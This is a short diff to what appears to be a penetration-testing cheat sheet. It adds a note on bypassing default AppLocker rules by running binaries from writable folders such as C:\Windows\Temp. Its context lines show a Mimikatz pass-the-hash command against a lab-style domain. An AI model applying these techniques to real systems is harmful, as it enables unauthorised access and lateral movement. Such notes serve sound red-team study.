@@ -276,6 +276,9 @@ Includes web services (not just port 80)
   ```
   - Note that the reg cmd value can be up to 16383 characters
 
+## App Whitelisting Bypasses
+- If default Applocker rules are applied, this means you can bypass by copying bins into `C:\Windows\Temp\` and similar writable folders for to execute.
+
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
 - Start new process as target user w/ NT hash:
